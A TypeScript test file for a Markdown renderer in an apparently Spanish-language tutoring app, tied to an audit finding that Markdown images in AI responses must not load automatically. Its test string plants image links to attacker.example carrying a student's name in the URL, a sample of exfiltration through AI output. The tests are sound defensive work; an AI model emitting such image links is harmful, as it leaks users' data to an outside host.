import test from "node:test";
import assert from "node:assert/strict";
import * as React from "react";
import { renderToStaticMarkup } from "react-dom/server";

// SEC-04 (auditoría del 21/10/2026): una imagen Markdown en la respuesta de la
// IA (chat, tests, exámenes) no puede convertirse en <img> que cargue sola.
// tsx compiles JSX with the classic runtime here (tsconfig "jsx": "preserve").
(globalThis as { React?: typeof React }).React = React;
async function render(content: string, reveal = false) {
  const { default: MarkdownRenderer } = await import("../components/markdown-renderer");
  return renderToStaticMarkup(React.createElement(MarkdownRenderer, { content, reveal }));
}
const planted = "Repasa la fotosíntesis.\n\n![pista](https://attacker.example/p.png?d=Ana)\n\n![](https://attacker.example/q.png)\n\nSigue así.";

for (const reveal of [false, true]) {
  test(`markdown images never render as <img> (reveal=${reveal})`, async () => {
    const html = await render(planted, reveal);
    assert.doesNotMatch(html, /<img/i);
    assert.doesNotMatch(html, /attacker\.example/);
    assert.match(html, /pista/);
    assert.match(html, /Sigue/);
  });
}

test("links still render as links", async () => {
  const html = await render("[web](https://example.org)");
  assert.match(html, /<a href="https:\/\/example\.org" target="_blank" rel="noopener noreferrer">/);
});
